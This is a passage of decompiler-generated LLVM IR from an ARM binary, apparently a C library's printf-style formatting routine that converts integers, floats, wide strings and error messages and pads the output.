  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_b620:                                ; preds = %dec_label_pc_b608
  store i32 %v0_b630, i32* %r3.global-to-local, align 4
  %v1_b624 = and i32 %v0_b630, 32
  %v2_b624 = icmp eq i32 %v1_b624, 0
  %.175 = select i1 %v2_b624, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_b630 = and i32 %v0_b630, 64
  %v2_b630 = icmp eq i32 %v1_b630, 0
  br i1 %v2_b630, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_b620
  %.176 = select i1 %v2_b624, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_b620, %bb138
  br i1 %v3_b63c, label %.thread84, label %dec_label_pc_b644

.thread84:                                        ; preds = %bb139
  %v5_b63c = sub nsw i32 0, %v4_b610
  store i32 %v5_b63c, i32* @r4, align 4
  br label %dec_label_pc_b65c

dec_label_pc_b644:                                ; preds = %bb139
  br i1 %v7_b724, label %bb140, label %dec_label_pc_b650

bb140:                                            ; preds = %dec_label_pc_b644
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_b65c

dec_label_pc_b650:                                ; preds = %dec_label_pc_b644
  br i1 %v7_b670, label %dec_label_pc_b660, label %dec_label_pc_b65c

dec_label_pc_b65c:                                ; preds = %.thread84, %bb140, %dec_label_pc_b650
  %v0_b68886 = phi i32 [ %v5_b63c, %.thread84 ], [ %v4_b610, %bb140 ], [ %v4_b610, %dec_label_pc_b650 ]
  br label %dec_label_pc_b660

dec_label_pc_b660:                                ; preds = %dec_label_pc_b650, %dec_label_pc_b65c
  %v0_b68885 = phi i32 [ %v0_b68886, %dec_label_pc_b65c ], [ %v4_b610, %dec_label_pc_b650 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_b65c ], [ 6, %dec_label_pc_b650 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_b660 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b660, i32* %r3.global-to-local, align 4
  %v1_b664 = icmp slt i32 %v3_b660, 0
  %v7_b668. = select i1 %v1_b664, i32 %v7_b668, i32 32
  store i32 %v7_b668., i32* @sb, align 4
  br i1 %v7_b670, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_b660
  store i32 %v2_b5bc, i32* @lr, align 4
  %v2_b678 = load i32, i32* @ip, align 4
  %v5_b678 = mul i32 %v2_b678, 4
  %v6_b678 = add i32 %v5_b678, %v2_b5bc
  store i32 %v6_b678, i32* %r3.global-to-local, align 4
  %v2_b67c = add i32 %v6_b678, -260
  %v3_b67c = inttoptr i32 %v2_b67c to i32*
  %v4_b67c = load i32, i32* %v3_b67c, align 4
  store i32 %v4_b67c, i32* %r3.global-to-local, align 4
  %v2_b684 = and i32 %v4_b67c, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_b660, %.thread16
  %storemerge94 = phi i32 [ %v2_b684, %.thread16 ], [ 1024, %dec_label_pc_b660 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_b68885, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_b690 = call i32 @_load_inttype()
  %v0_b694 = load i32, i32* @r1, align 4
  store i32 %v0_b694, i32* %r2.global-to-local, align 4
  %v0_b6a0 = load i32, i32* @r4, align 4
  store i32 %v0_b6a0, i32* %r3.global-to-local, align 4
  store i32 %v2_b6a4, i32* %r0.global-to-local, align 4
  %v0_b6a8 = load i32, i32* @r5, align 4
  %v6_b6ac = call i32 @_uintmaxtostr(i8* %v5_b6ac, i32 %v0_b690, i32 %v0_b694, i32 %v0_b6a0, i32 %v0_b6a8)
  store i32 %v6_b6ac, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_b6ac, i32* @r6, align 4
  br i1 %v3_b6bc, label %bb148, label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %bb145
  %v7_b6ac = inttoptr i32 %v6_b6ac to i8*
  %v3_b6c0 = load i8, i8* %v7_b6ac, align 1
  %v7_b6c4 = icmp eq i8 %v3_b6c0, 45
  %v2_b6cc = or i32 %v0_b630, 2
  %v2_b6cc.stack_var_-316.4 = select i1 %v7_b6c4, i32 %v2_b6cc, i32 %v0_b630
  store i32 %v2_b6cc.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_b6c4, label %.thread18, label %dec_label_pc_b6e0

.thread18:                                        ; preds = %dec_label_pc_b6c0
  %v3_b6d0 = add i32 %v6_b6ac, 1
  store i32 %v3_b6d0, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_b6e0:                                ; preds = %dec_label_pc_b6c0
  %v1_b6e0 = and i32 %v2_b6cc.stack_var_-316.4, 2
  %v2_b6e0 = icmp eq i32 %v1_b6e0, 0
  br i1 %v2_b6e0, label %dec_label_pc_b6ec, label %bb146

bb146:                                            ; preds = %dec_label_pc_b6e0
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_b6ec:                                ; preds = %dec_label_pc_b6e0
  %v1_b6ec = urem i32 %v2_b6cc.stack_var_-316.4, 2
  %v2_b6ec = icmp eq i32 %v1_b6ec, 0
  br i1 %v2_b6ec, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_b6ec
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_b6ec, %bb147
  %v0_b748 = phi i32 [ %v6_b6ac, %bb145 ], [ %v3_b6d0, %.thread18 ], [ %v6_b6ac, %dec_label_pc_b6ec ], [ %v6_b6ac, %bb147 ], [ %v6_b6ac, %bb146 ]
  %v0_b704 = phi i32 [ %v0_b630, %bb145 ], [ %v2_b6cc, %.thread18 ], [ %v0_b630, %dec_label_pc_b6ec ], [ %v0_b630, %bb147 ], [ %v0_b630, %bb146 ]
  %v3_b6f4 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b6f4, i32* %r2.global-to-local, align 4
  store i32 %v0_b704, i32* %r3.global-to-local, align 4
  %v1_b6fc = icmp slt i32 %v3_b6f4, 0
  br i1 %v1_b6fc, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_b72c = phi i32 [ %v3_b6f4, %bb148 ], [ 1, %bb149 ]
  %v1_b704 = and i32 %v0_b704, 16
  %v2_b704 = icmp eq i32 %v1_b704, 0
  store i32 %v2_b8d8, i32* %r3.global-to-local, align 4
  %v2_b70c = sub i32 %v2_b8d8, %v0_b748
  %v1_b710 = add i32 %v2_b70c, 127
  store i32 %v1_b710, i32* @r5, align 4
  br i1 %v2_b704, label %bb157, label %dec_label_pc_b718

dec_label_pc_b718:                                ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_b718
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_b718, %bb151
  br i1 %v7_b724, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_b72c, %v1_b710
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_b730, label %dec_label_pc_b738, label %bb157

dec_label_pc_b738:                                ; preds = %bb155
  %v1_b738 = inttoptr i32 %v0_b748 to i8*
  %v2_b738 = load i8, i8* %v1_b738, align 1
  %v3_b738 = zext i8 %v2_b738 to i32
  store i32 %v3_b738, i32* %r3.global-to-local, align 4
  %v7_b73c = icmp eq i8 %v2_b738, 48
  br i1 %v7_b73c, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_b738
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_b738
  %v2_b744 = add i32 %v2_b70c, 128
  store i32 %v2_b744, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_b780 = phi i32 [ %v0_b72c, %bb155 ], [ %v0_b72c, %bb150 ], [ 1, %bb156 ], [ %v2_b744, %.thread25 ], [ %v0_b72c, %bb154 ]
  %v1_b748 = inttoptr i32 %v0_b748 to i8*
  %v2_b748 = load i8, i8* %v1_b748, align 1
  %v3_b748 = zext i8 %v2_b748 to i32
  store i32 %v3_b748, i32* %r3.global-to-local, align 4
  %v7_b74c = icmp eq i8 %v2_b748, 48
  br i1 %v7_b74c, label %dec_label_pc_b754, label %dec_label_pc_b77c

dec_label_pc_b754:                                ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_b758 = load i32, i32* @r7, align 4
  %v7_b75c = icmp slt i32 %v0_b758, 6
  br i1 %v7_b75c, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_b754
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_b754, %bb158
  br i1 %v7_b670, label %.thread26, label %dec_label_pc_b770

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_13714.447 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_b8f0

dec_label_pc_b770:                                ; preds = %bb159
  %v2_b770 = icmp eq i32 %v5_b780, 0
  br i1 %v2_b770, label %bb160, label %dec_label_pc_b77c

bb160:                                            ; preds = %dec_label_pc_b770
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_b8f0

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b770, %bb157
  %v2_b77c = sub i32 %v5_b780, %v1_b710
  %tmp199 = icmp ugt i32 %v5_b780, %v1_b710
  br i1 %tmp199, label %.thread90, label %dec_label_pc_b8f0

.thread90:                                        ; preds = %dec_label_pc_b77c
  store i32 %v2_b77c, i32* @r4, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b600
  br i1 %tmp196, label %dec_label_pc_b7c8, label %dec_label_pc_b794

dec_label_pc_b794:                                ; preds = %dec_label_pc_b78c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_b7a0 = load i32, i32* @fp, align 4
  store i32 %v0_b7a0, i32* %r0.global-to-local, align 4
  %v2_b7a4 = load i32, i32* %v1_b5e8, align 4
  %v5_b7a4 = load i32, i32* %v4_b7a4, align 4
  store i32 %v5_b7a4, i32* %r2.global-to-local, align 4
  store i32 %v2_b7a8, i32* %r3.global-to-local, align 4
  %v6_b7ac = call i32 @_fpmaxtostr(i32 %v0_b7a0, i32 %v2_b7a4, i32 %v5_b7a4, i32* nonnull %stack_var_-328, i32 46092)
  store i32 %v6_b7ac, i32* %r0.global-to-local, align 4
  %v1_b7b0 = icmp slt i32 %v6_b7ac, 0
  br i1 %v1_b7b0, label %dec_label_pc_ba5c, label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b794
  %v2_b7bc = add i32 %v6_b7ac, %stack_var_-336.2
  store i32 %v2_b7bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba48

dec_label_pc_b7c8:                                ; preds = %dec_label_pc_b78c
  br i1 %v3_b7cc, label %dec_label_pc_b868, label %dec_label_pc_b7d0

dec_label_pc_b7d0:                                ; preds = %dec_label_pc_b7c8
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_b7c8, label %dec_label_pc_b7e0, label %dec_label_pc_b830

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b7d0
  %v2_b7e0 = load i32, i32* %v1_b5e8, align 4
  store i32 %v2_b7e0, i32* %r3.global-to-local, align 4
  %v9_b7e4 = icmp eq i32 %v2_b7e0, 0
  store i32 %v2_b7e0, i32* %stack_var_-44, align 4
  br i1 %v9_b7e4, label %dec_label_pc_b8f8, label %dec_label_pc_b7f0

dec_label_pc_b7f0:                                ; preds = %dec_label_pc_b7e0
  %v3_b7f0 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b7f0, i32* %r3.global-to-local, align 4
  store i32 %v2_b7f4, i32* @r0, align 4
  %v5_b800 = icmp slt i32 %v3_b7f0, -1
  br i1 %v5_b800, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_b7f0
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_b7f0, %bb161
  %storemerge193 = phi i32 [ %v3_b7f0, %bb161 ], [ -1, %dec_label_pc_b7f0 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_b7f4, i32* @r1, align 4
  store i32 %v2_b808, i32* %r3.global-to-local, align 4
  %v0_b80c = call i32 @__GI_wcsrtombs()
  store i32 %v0_b80c, i32* %r0.global-to-local, align 4
  %v7_b810 = icmp eq i32 %v0_b80c, -1
  store i32 %v0_b80c, i32* @r5, align 4
  br i1 %v7_b810, label %dec_label_pc_ba5c, label %dec_label_pc_b81c

dec_label_pc_b81c:                                ; preds = %bb162
  %v0_b81c = load i32, i32* @sl, align 4
  store i32 %v0_b81c, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_b81c, i32* @r6, align 4
  br label %dec_label_pc_b90c

dec_label_pc_b830:                                ; preds = %dec_label_pc_b7d0
  store i32 %v2_b8d8, i32* %r8.global-to-local, align 4
  %v2_b834 = load i32, i32* %v1_b5e8, align 4
  store i32 %v2_b808, i32* %r2.global-to-local, align 4
  store i32 %v2_b8d8, i32* %r0.global-to-local, align 4
  %v3_b840 = call i32 @__GI_wcrtomb(i32 %v2_b8d8, i32 %v2_b834, i32 %v2_b808)
  store i32 %v3_b840, i32* %r0.global-to-local, align 4
  %v7_b844 = icmp eq i32 %v3_b840, -1
  store i32 %v3_b840, i32* @r5, align 4
  br i1 %v7_b844, label %dec_label_pc_ba5c, label %dec_label_pc_b850

dec_label_pc_b850:                                ; preds = %dec_label_pc_b830
  %v0_b850 = load i32, i32* @sl, align 4
  store i32 %v0_b850, i32* @r4, align 4
  store i32 %v2_b8d8, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_b860 = trunc i32 %v0_b850 to i8
  %v2_b860 = load i32, i32* %r8.global-to-local, align 4
  %v4_b860 = add i32 %v2_b860, %v3_b840
  %v5_b860 = inttoptr i32 %v4_b860 to i8*
  store i8 %v1_b860, i8* %v5_b860, align 1
  %v0_b910.pre.pre = load i32, i32* @r5, align 4
  %v1_b910.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b868:                                ; preds = %dec_label_pc_b7c8
  br i1 %v3_b86c, label %dec_label_pc_b8cc, label %dec_label_pc_b870

dec_label_pc_b870:                                ; preds = %dec_label_pc_b868
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_b878 = load i32, i32* %v1_b5e8, align 4
  br i1 %v7_b868, label %dec_label_pc_b878, label %dec_label_pc_b8a4

dec_label_pc_b878:                                ; preds = %dec_label_pc_b870
  store i32 %v2_b878, i32* @r6, align 4
  %v2_b87c = icmp eq i32 %v2_b878, 0
  br i1 %v2_b87c, label %dec_label_pc_b8f8, label %dec_label_pc_b884

dec_label_pc_b884:                                ; preds = %dec_label_pc_b878, %dec_label_pc_b8d4
  %v0_b894 = phi i32 [ %v2_b878, %dec_label_pc_b878 ], [ %v3_b8e4, %dec_label_pc_b8d4 ]
  %v3_b884 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b884, i32* %r3.global-to-local, align 4
  %v5_b890 = icmp slt i32 %v3_b884, -1
  br i1 %v5_b890, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_b884
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_b884, %bb163
  %storemerge194 = phi i32 [ %v3_b884, %bb163 ], [ -1, %dec_label_pc_b884 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_b894, i32* %r0.global-to-local, align 4
  %v1_b898 = inttoptr i32 %v0_b894 to i8*
  %v2_b898 = call i32 @strnlen(i8* %v1_b898)
  store i32 %v2_b898, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b900

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b870
  store i32 %v2_b878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_b8d8, i32* @r6, align 4
  store i32 %v2_b878, i32* %stack_var_-180, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b868
  br i1 %v7_b8cc, label %dec_label_pc_b8d4, label %dec_label_pc_ba5c

dec_label_pc_b8d4:                                ; preds = %dec_label_pc_b8cc
  %v0_b8d4 = call i32 @__errno_location()
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  %v1_b8dc = inttoptr i32 %v0_b8d4 to i32*
  %v2_b8dc = load i32, i32* %v1_b8dc, align 4
  store i32 %v2_b8dc, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_b8e4 = call i32 @__GI___glibc_strerror_r(i32 %v2_b8dc, i32 %v2_b8d8, i32 128)
  store i32 %v3_b8e4, i32* %r0.global-to-local, align 4
  store i32 %v3_b8e4, i32* @r6, align 4
  br label %dec_label_pc_b884

dec_label_pc_b8f0:                                ; preds = %dec_label_pc_b77c, %.thread26, %bb160
  %v0_b910.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_b710, %dec_label_pc_b77c ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b8f8:                                ; preds = %dec_label_pc_b878, %dec_label_pc_b7e0
  store i32 ptrtoint ([7 x i8]* @global_var_1371c.450 to i32), i32* @r6, align 4
  br label %dec_label_pc_b900

dec_label_pc_b900:                                ; preds = %bb164, %dec_label_pc_b8f8
  %storemerge = phi i32 [ 6, %dec_label_pc_b8f8 ], [ %v2_b898, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_b90c

dec_label_pc_b90cthread-pre-split:                ; preds = %.thread90, %dec_label_pc_b850, %dec_label_pc_b8a4, %dec_label_pc_b8f0
  %v1_b910.pre = phi i32 [ 0, %dec_label_pc_b8f0 ], [ %v1_b910.pre.pre, %dec_label_pc_b850 ], [ 0, %dec_label_pc_b8a4 ], [ %v2_b77c, %.thread90 ]
  %v0_b910.pre = phi i32 [ %v0_b910.pre81, %dec_label_pc_b8f0 ], [ %v0_b910.pre.pre, %dec_label_pc_b850 ], [ 1, %dec_label_pc_b8a4 ], [ %v1_b710, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_b704, %dec_label_pc_b8f0 ], [ %v0_b630, %dec_label_pc_b850 ], [ %v0_b630, %dec_label_pc_b8a4 ], [ %v0_b704, %.thread90 ]
  %v0_b90c.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_b90c

dec_label_pc_b90c:                                ; preds = %dec_label_pc_b90cthread-pre-split, %dec_label_pc_b81c, %dec_label_pc_b900
  %v1_b94c = phi i32 [ %v1_b910.pre, %dec_label_pc_b90cthread-pre-split ], [ %v0_b81c, %dec_label_pc_b81c ], [ 0, %dec_label_pc_b900 ]
  %v0_b910 = phi i32 [ %v0_b910.pre, %dec_label_pc_b90cthread-pre-split ], [ %v0_b80c, %dec_label_pc_b81c ], [ %storemerge, %dec_label_pc_b900 ]
  %v0_b918 = phi i32 [ %v0_b90c.pr, %dec_label_pc_b90cthread-pre-split ], [ 11, %dec_label_pc_b81c ], [ 11, %dec_label_pc_b900 ]
  %v0_b954 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_b90cthread-pre-split ], [ %v0_b630, %dec_label_pc_b81c ], [ %v0_b630, %dec_label_pc_b900 ]
  %v7_b90c = icmp eq i32 %v0_b918, 11
  %v2_b910 = add i32 %v0_b910, %v1_b94c
  br i1 %v7_b90c, label %dec_label_pc_b928, label %bb165

bb165:                                            ; preds = %dec_label_pc_b90c
  %v7_b920 = icmp sgt i32 %v0_b918, 5
  %. = select i1 %v7_b920, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_b924 = add i32 %., %v2_b910
  br label %dec_label_pc_b928

dec_label_pc_b928:                                ; preds = %dec_label_pc_b90c, %bb165
  %v0_b93c = phi i32 [ %v2_b910, %dec_label_pc_b90c ], [ %v2_b924, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_b92c = sub i32 %tmp97, %v0_b93c
  %v3_b92c = icmp uge i32 %tmp97, %v0_b93c
  %v9_b92c = icmp eq i32 %tmp97, %v0_b93c
  %v2_b930 = xor i1 %v3_b92c, true
  %v3_b930 = or i1 %v9_b92c, %v2_b930
  br i1 %v3_b930, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_b928
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_b928, %bb166
  %v2_b934 = xor i1 %v9_b92c, true
  %v3_b934 = and i1 %v3_b92c, %v2_b934
  br i1 %v3_b934, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_b93c.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_b92c, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_b94c = phi i32 [ %v1_b93c.pre, %._crit_edge ], [ %v2_b92c, %bb168 ]
  %v2_b93c = add i32 %v0_b93c, %stack_var_-336.2
  %v2_b940 = add i32 %v2_b93c, %v2_b94c
  store i32 %v2_b940, i32* @ip, align 4
  store i32 %v0_b954, i32* %r3.global-to-local, align 4
  %v0_b948 = load i32, i32* @sb, align 4
  %v7_b948 = icmp eq i32 %v0_b948, 48
  br i1 %v7_b948, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_b94c = add i32 %v2_b94c, %v1_b94c
  store i32 %v3_b94c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_b968 = phi i32 [ %v2_b94c, %bb169 ], [ 0, %bb170 ]
  %v1_b954 = and i32 %v0_b954, 8
  store i32 %v1_b954, i32* @r8, align 4
  %v2_b954 = icmp eq i32 %v1_b954, 0
  br i1 %v2_b954, label %dec_label_pc_b960, label %dec_label_pc_b97c

dec_label_pc_b960:                                ; preds = %.thread29
  %v0_b960 = load i32, i32* @fp, align 4
  store i32 %v0_b960, i32* %r0.global-to-local, align 4
  store i32 %v0_b968, i32* %r2.global-to-local, align 4
  %v4_b96c = call i32 @_charpad(i32 %v0_b960, i8 32, i32 %v0_b968)
  store i32 %v4_b96c, i32* %r0.global-to-local, align 4
  %v1_b970 = load i32, i32* @sl, align 4
  %v9_b970 = icmp eq i32 %v4_b96c, %v1_b970
  br i1 %v9_b970, label %dec_label_pc_b978, label %dec_label_pc_ba5c

dec_label_pc_b978:                                ; preds = %dec_label_pc_b960
  %v0_b978 = load i32, i32* @r8, align 4
  store i32 %v0_b978, i32* @sl, align 4
  %v0_b984.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %.thread29, %dec_label_pc_b978
  %v0_b984 = phi i32 [ %v0_b918, %.thread29 ], [ %v0_b984.pre, %dec_label_pc_b978 ]
  %v0_b980 = load i32, i32* @fp, align 4
  %v2_b984 = add i32 %v0_b984, ptrtoint (i32* @global_var_13724.452 to i32)
  store i32 %v2_b984, i32* %r0.global-to-local, align 4
  %v2_b988 = inttoptr i32 %v2_b984 to i8*
  %v3_b988 = call i32 @__GI_fputs_unlocked(i8* %v2_b988, i32 %v0_b980)
  %v0_b98c = load i32, i32* @fp, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v0_b994 = load i32, i32* @r4, align 4
  store i32 %v0_b994, i32* %r2.global-to-local, align 4
  %v4_b998 = call i32 @_charpad(i32 %v0_b98c, i8 48, i32 %v0_b994)
  store i32 %v4_b998, i32* %r0.global-to-local, align 4
  %v1_b99c = load i32, i32* @r4, align 4
  %v9_b99c = icmp eq i32 %v4_b998, %v1_b99c
  br i1 %v9_b99c, label %dec_label_pc_b9a4, label %dec_label_pc_ba5c

dec_label_pc_b9a4:                                ; preds = %dec_label_pc_b97c
  %v3_b9a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9a4, i32* %r3.global-to-local, align 4
  %v2_b9a8 = icmp eq i32 %v3_b9a4, 0
  br i1 %v2_b9a8, label %dec_label_pc_b9b8, label %dec_label_pc_ba18thread-pre-split

dec_label_pc_b9b8:                                ; preds = %dec_label_pc_b9a4
  %v0_b9b8 = load i32, i32* @r5, align 4
  %v2_b9b8 = icmp eq i32 %v0_b9b8, 0
  br i1 %v2_b9b8, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_b9b8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_b9b8
  %v1_b9c0 = load i32, i32* @r6, align 4
  store i32 %v1_b9c0, i32* %r0.global-to-local, align 4
  %v1_b9c8 = load i32, i32* @fp, align 4
  store i32 %v1_b9c8, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 47568, i32* @lr, align 4
  %v1_b9cc = xor i1 %v2_b9b8, true
  call void @__pseudo_cond_branch(i1 %v1_b9cc, i32 ptrtoint (i32* @global_var_eec0.443 to i32))
  %v0_b9d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b9d0 = load i32, i32* @r5, align 4
  %v9_b9d0 = icmp eq i32 %v0_b9d0, %v1_b9d0
  br i1 %v9_b9d0, label %dec_label_pc_ba30, label %dec_label_pc_ba5c

dec_label_pc_b9dc:                                ; preds = %dec_label_pc_ba18
  %v2_b9dc = icmp ult i32 %v1_b9e0, 128
  %.v1_b9e0 = select i1 %v2_b9dc, i32 %v1_b9e0, i32 128
  store i32 %.v1_b9e0, i32* @r2, align 4
  %v0_b9e8 = call i32 @__GI_wcsrtombs()
  store i32 %v0_b9e8, i32* @r4, align 4
  %v2_b9ec = icmp eq i32 %v0_b9e8, 0
  store i32 %v0_b9e8, i32* %r3.global-to-local, align 4
  store i32 %v2_b8d8, i32* %r0.global-to-local, align 4
  %v0_b9fc = load i32, i32* @fp, align 4
  store i32 %v0_b9fc, i32* %r2.global-to-local, align 4
  br i1 %v2_b9ec, label %dec_label_pc_ba0c, label %dec_label_pc_ba04

dec_label_pc_ba04:                                ; preds = %dec_label_pc_b9dc
  %v3_ba04 = call i32 @__stdio_fwrite(i32 %v2_b8d8, i32 %v0_b9e8, i32 %v0_b9fc)
  store i32 %v3_ba04, i32* %r0.global-to-local, align 4
  store i32 %v3_ba04, i32* %r3.global-to-local, align 4
  %v1_ba0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ba0c

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_b9dc, %dec_label_pc_ba04
  %v1_ba0c = phi i32 [ 0, %dec_label_pc_b9dc ], [ %v1_ba0c.pre, %dec_label_pc_ba04 ]
  %v0_ba10 = phi i32 [ 0, %dec_label_pc_b9dc ], [ %v3_ba04, %dec_label_pc_ba04 ]
  %v9_ba0c = icmp eq i32 %v0_ba10, %v1_ba0c
  %v1_ba10 = load i32, i32* @r5, align 4
  %v2_ba10 = sub i32 %v1_ba10, %v0_ba10
  store i32 %v2_ba10, i32* @r5, align 4
  br i1 %v9_ba0c, label %dec_label_pc_ba18, label %dec_label_pc_ba5c

dec_label_pc_ba18thread-pre-split:                ; preds = %dec_label_pc_b9a4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_ba1c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_ba18thread-pre-split, %dec_label_pc_ba0c
  %v1_b9e0 = phi i32 [ %v0_ba1c.pr, %dec_label_pc_ba18thread-pre-split ], [ %v2_ba10, %dec_label_pc_ba0c ]
  store i32 %v2_b8d8, i32* @r6, align 4
  %v2_ba1c = icmp eq i32 %v1_b9e0, 0
  store i32 %v2_b7f4, i32* @r1, align 4
  store i32 %v2_b808, i32* %r3.global-to-local, align 4
  store i32 %v2_b8d8, i32* @r0, align 4
  br i1 %v2_ba1c, label %dec_label_pc_ba30, label %dec_label_pc_b9dc

dec_label_pc_ba30:                                ; preds = %dec_label_pc_ba18, %.thread36
  %v0_ba30 = load i32, i32* @fp, align 4
  store i32 %v0_ba30, i32* %r0.global-to-local, align 4
  %v0_ba38 = load i32, i32* @sl, align 4
  store i32 %v0_ba38, i32* %r2.global-to-local, align 4
  %v4_ba3c = call i32 @_charpad(i32 %v0_ba30, i8 32, i32 %v0_ba38)
  store i32 %v4_ba3c, i32* %r0.global-to-local, align 4
  %v1_ba40 = load i32, i32* @sl, align 4
  %v9_ba40 = icmp eq i32 %v4_ba3c, %v1_ba40
  br i1 %v9_ba40, label %dec_label_pc_ba48, label %dec_label_pc_ba5c

